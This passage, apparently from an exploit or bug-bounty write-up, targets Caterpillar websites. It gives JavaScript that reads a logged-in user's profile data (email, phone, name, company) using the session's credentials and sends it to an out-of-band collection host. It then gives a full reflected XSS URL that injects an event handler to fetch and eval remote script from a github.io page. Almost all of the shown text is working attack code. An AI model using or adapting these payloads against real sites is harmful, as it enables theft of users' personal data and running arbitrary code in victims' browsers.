fetch('https://parts.cat.com/wcs/resources/store/20203/person/@self?responseFormat=json',{credentials:'include'})
.then(r=>r.json())
.then(d=>{
  const essentials = {
    userId: d.userId,
    email: d.email1,
    phone: d.phone1,
    name: d.firstName + ' ' + d.lastName,
    company: d.companyName,
    country: d.country
  }
  return fetch('https://cr70ebszwf06lp7i0msf30hmwd24qwlka.oastify.com/?data='+encodeURIComponent(JSON.stringify(essentials)))
})
.catch(e=>console.log('Error:',e.message))
```

Then test the **complete XSS payload** by visiting this URL in your browser:
```
https://designreuseuat.cat.com/auth/?locale=en_US&initialLoginPage=trf%22%20onpointermove%3d%22fetch(%27https%3A//nayssers.github.io/kkk.js%27).then(r%3Dr.text()).then(eval)%22%20style%0C%3d%22display%3Ablock%3Bwidth%3A100%25%3Bheight%3A100%25%22%20x%3d%22
